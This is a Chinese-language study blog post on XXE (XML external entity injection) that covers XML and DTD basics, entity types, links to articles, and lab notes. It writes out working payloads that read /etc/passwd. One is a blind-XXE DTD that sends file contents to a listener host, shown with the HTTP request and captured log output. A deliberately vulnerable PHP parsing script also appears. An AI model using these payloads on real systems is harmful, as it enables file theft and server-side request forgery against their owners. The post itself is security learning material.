---
title: XXE 漏洞学习
date: 2017-09-04 13:20:46
tags:
		- 
categories:
		- Web安全

---

XXE漏洞学习。

<!-- more -->




##### XXE漏洞学习


XML被设计为传输和存储数据，其焦点是数据的内容。

HTML被设计为用来显示数据，其焦点是数据的外观。

XML把数据从HTML分离。

![](http://p2.qhimg.com/t01c0144f2f69a0c5ab.png)



* 什么是 XXE
* XML和DTD的关系
* XXE漏洞原理
* XXE漏洞的类型
* XXE漏洞应用场景以及盲测
* XXE漏洞攻击举例


数据编写语言，存储结构

用自己定义的标签来写语句。。

	<?xml version="1.0" encoding="utf-8">
	<girl>
	<hair>Liuhai</hair>
	</girl>

#####  XML和DTD的关系

DTD数据库表结构  XML 数据记录。。 XML按照DTD的格式进行存储，DTD对XML的解析。

由于DTD，每个XML文件可以携带一个自身格式的描述

由于DTD，不同组织的人可以使用一个通用DTD来交换数据

应用程序可以使用一个标准DTD校验从外部世界接收来的XML数据是否有效。。(作为一个标准，校验从外部接收的XML数据是否合法)

##### XML实体

XML实体可以分为：普通实体，参数实体

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-8-31/58658848.jpg)



DTD标签的解析。文档类型定义。  DTD--解释XML。。
 
* 内部DTD文档  

 	`<!DOCTYPE 跟元素[元素声明]>`

* 外部DTD文档  

	<!DOCTYPE 跟元素 SYSTEM "文件名">

	或者
	<!DOCTYPE 跟元素 PUBLIC "public_ID" 文件名> 

 system "DTD文件路径"  外部加载。。dtd类似HTML的js、css的引用。外部和内部的引入。




XML实体：普通实体，参数实体

##### 危害

* 任意文件读取 
* URL请求 ssrf
* 


XML、External、Entity、Injection、。

HTML的一种，一种可扩展的标记语言。。

标签的解析 DTD

标签的定义 





----------
 0904
[浅谈XXE漏洞攻击与防御](https://thief.one/2017/06/20/1/)


XML文档结构包括三部分

XML声明、DTD文档类型定义、文档结构

xxe漏洞和DTD文档有关。。

DTD 文档类型定义可定义合法的XML文档构建模块，它使用一些列合法的元素结构来定义文档结果，DTD可被声明于XL文档中(内部使用)，也可作为一个外部引用。类似与CSS、JS。

内部声明DTD
	
	<!DOCTYPE 跟元素 [元素声明]>

引用外部DTD

	<!DOCTYPE 跟元素 SYSTEM "文件名">

DTD文档中有很多重要的关键字如下：

- DOCTYPE(DTD的声明)
- ENTITY(实体声明)
- SYSTEM、PUBLIC （外部资源申请）

* 实体

实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用改变量的值。实体按照类型主要分为四种。

- 内置实体 (Built-in entities)
- 字符实体 (Character entities)
- 通用实体 (General entities)
- 参数实体 (Parameter entities)

实体根据引用方式，还可以分为内部实体与外部实体。


* 实体类别介绍

参数实体用%实体声明，引用时也用%实体名称；

	{!ENTITY % ename "entity_value"}



XXE漏洞全称 XML External Entity Injection xml外部实体注入漏洞。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、内网端口扫描、攻击内网网站。

* XML漏洞检测

**第一步检测XML是否会被成功解析**

**第二步检测服务器是否支持DTD引用外部实体；**


如果支持引用外部实体，那么可能存在XXE漏洞


----------

[XXE漏洞的简单理解和测试](https://b1ngz.github.io/XXE-learning-note/)

XXE(XML External Entity Injection)漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载。

实体(Entities)

外部实体(Externally Entities)

简单的理解，一个实体就是一个变量，可以在文档中的其他位置引用改变量。


实体的声明必须在DTD文件中 或 `<!DOCTYPE>`

	<?xml version="1.0" encoding="utf-8">
	<!DOCTYPE foo> [

	<!ENTITY name "value">]>
	<foo>

		<value>&name;</value>
	</foo>

参数实体的引用是以 %name; 的格式来引用，其他实体则是 &name;的格式， name 为实体名。。

只有在DTD文件中，参数实体的声明才能引用其他实体。

参数实体只能在DTD文件中被引用，其他实体在XML文档内引用。


* Blind XXE

传统的XXE，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器文件，例如提交请求

	<!ENTITY file SYSTEM "file:///etc/passwd">
	<usernamne>&file;</username>

服务器在这个节点中返回etc/passwd的文件内容

	<username>root:1:3.....</username>

如果服务器没有回显，只能使用 Blind XXE漏洞来构建一条带外信道提取数据。

XXE


----------

##### [XML攻击实验](http://www.beesfun.com/2017/04/21/play%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6XXE%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/)

0905。。通过这个实验，大概了解了XXE注入的一个流程，它引用外部实体，我们通过在外部实体中构造payload来去读取其中的敏感信息。

这个实验很好，多加练习深刻理解其中的原理。


练习的目标：读取任意文件，获取隐藏的url，利用获得的信息登入系统

	There are 2 objectives in this exercise:
	
	Get arbitrary file access
	Find the secret URL using the previous bug
	Login as the user admin using the arbitrary file access

检测是否存在XXE，一是是否解析XML文件，而是是否可以引用外部实体。


请求一下外部实体

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-5/63739933.jpg)

外部实体的日志信息

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-5/81480846.jpg)

通过找本地服务器的监听内容，表明目标服务器会解析XML内容，并发出了外部实体请求。

* 任意文件读取

目标服务器会请求外部实体，那么可以在自己的本地服务器写一个payload，test.dtd文件，返回给目标服务器。


	  1 <!ENTITY % p1 SYSTEM "file:///etc/passwd">
	  2 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.145.225:8000/BLAH?%p1;'>">
	  3 %p2;


访问目标服务器。。。引用外部实体。。

	POST /login HTTP/1.1
	Host: 192.168.145.243
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
	Accept-Encoding: gzip, deflate
	Content-Type: text/xml
	Content-Length: 100
	Referer: http://192.168.145.243/login
	Connection: close
	Upgrade-Insecure-Requests: 1
	
	<?xml version="1.0"?>
	<!DOCTYPE foo SYSTEM "http://192.168.145.225:8000/test.dtd">
	<foo>&e1;</foo>


在本地服务器的日志可以查看信息

	192.168.145.243 - - [05/Sep/2017 13:28:39] "GET /BLAH?root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1" 404 -

* 读取文件2

修改 test.dtd  file的路径改变一下。

	1 <!ENTITY % p1 SYSTEM "file:///opt/play-2.1.3/xxe/">
  	2 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.145.225:8000/id?%p1;'>">
  	3 %p2;



读取到的信息。。URL可以解码一下。

	192.168.145.243 - - [05/Sep/2017 13:36:51] "GET /id?.gitignore%0A.settings%0Aapp%0Aconf%0Alogs%0Aproject%0Apublic%0AREADME%0ARUNNING_PID%0Atarget%0Atest%0A HTTP/1.1" 404 -


如下

	.gitignore
	.settings
	app
	conf
	logs
	project
	public
	README
	RUNNING_PID
	target
	test


----------

[XML实体攻击回顾](http://rickgray.me/2015/06/08/xml-entity-attack-review.html)

这篇文章关于实体讲解的到位。

* 外部实体用于加载外部文件的内容。（XXE攻击主要利用此实体）

	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE root [
		<!ENTITY outfile SYSTEM "outfile.xml">
	]>
	<root><outfile>&outfile;</outfile></root>

* 参数实体 

用于DTD和文档的内部子集中。与一般实体相比，它以字符(%)开始，以字符(;)结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。（XXE攻击常结合利用参数实体进行数据回显）

----------

[XXE的盲注](http://blog.csdn.net/u011721501/article/details/43775691)


这篇文章主要讲解了XXE的盲注的利用。做的那个实验就是XXE的盲注。。

参数实体是一种只能在DTD中定义和使用的实体。一般引用时使用%作为前缀,;为结束。


----------


[http://bobao.360.cn/learning/detail/3841.html]()
[XML教程](http://www.w3school.com.cn/xml/)



----------

0906

学习XXE，必须了解XML、ENtity、DOCTYPE、DTD基础知识。

参数实体的声明和引用都是以百分号%开头。



----------

[XML实体注入漏洞攻与防](http://www.hackersb.cn/hacker/211.html)


在XML中使用特殊字符，需要使用实体字符，也可以将一些可能多次会使用到的短语设置为实体，然后就可以在内容中使用。

如下就声明一个名字为 coname 值为 topsec 的实体

	<!DOCTYPE UserData [ <!ENTITY coname "topsec"> ]>

在XML中使用实体，使用 &coname; 即可。

xxe.php



	<?php
	$xml = file_get_contents("php://input");
	$data = simplexml_load_string($xml);
	
	foreach ($data as $key => $value){
	    echo "Your" . translate($key) . "is: " . $value . "<br>";
	    }
	
	function translate($str){
	    switch($str){
	        case "name":
	            return "Name";
	        case "wechat":
	            return "Wechat";
	        case "website":
	            return "website";
	        
	        }
	    
	    }
	?>


访问一下





![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-7/66825030.jpg)



----------

[simplexml_load_string](https://secure.php.net/function.simplexml-load-string)


----------
 
libxml 2.8.0  必须有这个。。


	libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。


遇到的坑，需要解决的问题，，`libxml Version	2.9.1` 自己的版本是2.9.1，默认是不解析外部实体的。。

现在的问题是卸载，2.9.1安装 2.8.0。


[卸载libxml2](http://installion.co.uk/ubuntu/trusty/main/l/libxml2-dev/uninstall/index.html)

----------

源码安装 php、mysql



----------

##### payload 


普通XML利用的payload。

* 有回显

	<?xml version="1.0" encoding="utf-8"?> 
	<!DOCTYPE xxe [
	<!ELEMENT name ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
	<root>
	<name>&xxe;</name>
	</root>

可以在页面看到其中的 /etc/passwd的信息。。



----------

[XXE被提起时我们会想到什么](http://www.mottoin.com/88085.html)

XML外部实体的概念，事实上外部实体是指实体的参数内容，不是当前XML定义的，而是从其他资源引入的。用SYSTEM、PUBLIC来声明。



----------

[XXE漏洞的简单理解和测试](http://www.mottoin.com/92794.html)   这篇文章讲解的很清楚，对于Blind XXE。



解释了 没有回显盲注的XXE


因为无法直接将要读取的文件内容发送到服务器，所以需要通过变量的方式，先把要读取的文件内容保存到变量中，然后通过 URL 引用外部实体的方式，在 URL 中引用该变量，让文件内容成为 URL 的一部分(如查询参数)，然后通过查看访问日志的方式来获取数据。



	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE root[
	<!ENTITY % remote SYSTEM 'http://192.168.145.225/1.xml'>
	%remotes]>
	</root>
